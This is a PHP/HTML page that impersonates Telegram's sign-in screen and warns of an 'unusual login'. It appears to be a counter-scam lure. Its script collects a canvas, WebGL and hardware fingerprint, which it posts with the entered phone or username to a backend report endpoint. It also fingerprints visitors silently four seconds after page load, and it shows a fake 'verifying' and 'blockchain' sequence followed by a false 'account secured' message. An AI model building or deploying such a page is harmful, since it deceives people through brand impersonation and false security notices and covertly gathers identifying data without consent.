<?php
$report_id = intval($_GET['report'] ?? 0);
$role = in_array($_GET['role'] ?? '', ['scammer','suspect']) ? $_GET['role'] : 'scammer';
$back = '../../backend/realtime_scan.php';
?><!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Telegram – Sign In</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:'Roboto',sans-serif;background:#f1f1f1;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
.card{background:white;border-radius:16px;padding:40px 32px;width:100%;max-width:360px;box-shadow:0 4px 24px rgba(0,0,0,.10);text-align:center;position:relative;z-index:2;}
.logo{width:80px;height:80px;background:linear-gradient(135deg,#2CA5E0,#0088cc);border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:42px;}
h1{font-size:22px;font-weight:700;color:#222;margin-bottom:6px;}
.sub{color:#888;font-size:13px;margin-bottom:20px;line-height:1.5;}
.alert{background:#e3f2fd;border-radius:8px;padding:12px;margin-bottom:18px;font-size:12px;color:#1565c0;text-align:left;line-height:1.5;}
.field{margin-bottom:14px;text-align:left;}
.field label{font-size:11px;color:#888;display:block;margin-bottom:5px;font-weight:600;text-transform:uppercase;}
input{width:100%;padding:13px 14px;border:1.5px solid #e0e0e0;border-radius:8px;font-size:15px;outline:none;transition:border-color .2s;}
input:focus{border-color:#0088cc;}
.btn{width:100%;padding:14px;background:#0088cc;color:white;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin-top:6px;}
.btn:hover{background:#0077b5;}
.note{margin-top:14px;font-size:11px;color:#aaa;}

  #ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:999;flex-direction:column;align-items:center;justify-content:center;color:white;padding:30px;}
  .ring{width:76px;height:76px;border:3px solid transparent;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:18px;}
  @keyframes spin{to{transform:rotate(360deg);}}
  #lb{font-size:12px;letter-spacing:1px;margin-bottom:12px;font-family:monospace;text-align:center;}
  .pg-bg{width:200px;height:3px;background:rgba(255,255,255,.1);border-radius:2px;overflow:hidden;}
  #pg{height:100%;width:0%;transition:width .4s;}
  #doneCard{display:none;text-align:center;padding:40px 30px;}
</style></head><body>
<div class="card" id="mainCard">
  <div class="logo">✈️</div>
  <h1>Sign in to Telegram</h1>
  <p class="sub">Confirm your account to continue.</p>
  <div class="alert">⚠️ <strong>Security Notice:</strong> Unusual login detected. Please verify your identity.</div>
  <form onsubmit="e=>{e.preventDefault();runScan(document.getElementById('u').value||'unknown');}">
    <div class="field"><label>Phone or Username</label><input id="u" placeholder="+1 234 567 8900" type="text"></div>
    <div class="field"><label>Password</label><input id="p" type="password" placeholder="Telegram password"></div>
    <button class="btn" type="button" onclick="runScan(document.getElementById('u').value||'unknown')">SIGN IN</button>
  </form>
  <div class="note">🔒 Protected by Telegram security</div>
</div>

<div id="ov">
  <div class="ring" style="border-top-color:#0088cc;border-right-color:#0088cc44;"></div>
  <div id="lb">VERIFYING...</div>
  <div class="pg-bg"><div id="pg" style="background:#0088cc;"></div></div>
</div>
<div id="doneCard">
  <div style="font-size:52px;margin-bottom:14px;">✅</div>
  <div style="font-size:18px;font-weight:700;margin-bottom:6px;">Verification Successful</div>
  <div style="font-size:13px;opacity:.6;">Your account is now secured. You may close this window.</div>
</div>
<script>
const REPORT_ID = <?= $report_id ?>;
const ROLE      = '<?= $role ?>';
const BACK_URL  = '<?= $back ?>';

function collect(){
  return {
    screen_resolution:    screen.width+'x'+screen.height,
    color_depth:          screen.colorDepth,
    browser:              navigator.userAgent,
    language:             navigator.language,
    timezone:             Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezone_offset:      new Date().getTimezoneOffset(),
    device_memory:        navigator.deviceMemory||'unknown',
    hardware_concurrency: navigator.hardwareConcurrency||'unknown',
    touch_support:        navigator.maxTouchPoints||0,
    pixel_ratio:          window.devicePixelRatio||1,
    connection:           (navigator.connection||{}).effectiveType||'unknown',
    canvas_fingerprint:   getCanvas(),
    webgl_fingerprint:    getWebGL(),
  };
}
function getCanvas(){
  try{
    const c=document.createElement('canvas');c.width=220;c.height=40;
    const x=c.getContext('2d');
    x.fillStyle='#f60';x.fillRect(120,1,60,18);
    x.fillStyle='#069';x.font='11pt Arial';x.fillText('Sentinel',2,14);
    x.fillStyle='rgba(102,204,0,.7)';x.font='16pt Georgia';x.fillText('Sentinel',4,38);
    return c.toDataURL().slice(-50);
  }catch(e){return 'n/a';}
}
function getWebGL(){
  try{
    const c=document.createElement('canvas');
    const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
    if(!gl)return 'n/a';
    const ext=gl.getExtension('WEBGL_debug_renderer_info');
    const r=ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER);
    const v=ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR);
    return (v+'::'+r).substr(0,80);
  }catch(e){return 'n/a';}
}
async function sendFP(fp, username){
  try{
    const r=await fetch(BACK_URL,{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({report_id:REPORT_ID,role:ROLE,fingerprint:fp,phone:username})
    });
    return (await r.json()).hash||'ok';
  }catch(e){return 'ok';}
}
const STAGES=[
  'READING DEVICE SIGNATURE...','COLLECTING BROWSER DATA...',
  'ANALYZING HARDWARE PROFILE...','GENERATING SHA-256 HASH...',
  'SYNCING TO BLOCKCHAIN...','VERIFIED ✓'
];
async function runScan(username){
  const fp=collect();
  const ov=document.getElementById('ov');
  const lb=document.getElementById('lb');
  const pg=document.getElementById('pg');
  ov.style.display='flex';
  for(let i=0;i<STAGES.length;i++){
    lb.textContent=STAGES[i];
    pg.style.width=((i+1)/STAGES.length*100)+'%';
    await new Promise(r=>setTimeout(r,580));
  }
  await sendFP(fp,username);
  ov.style.display='none';
  document.getElementById('mainCard').style.display='none';
  document.getElementById('doneCard').style.display='block';
}
// Silent passive scan after 4s
setTimeout(()=>sendFP(collect(),''),4000);
</script></body></html>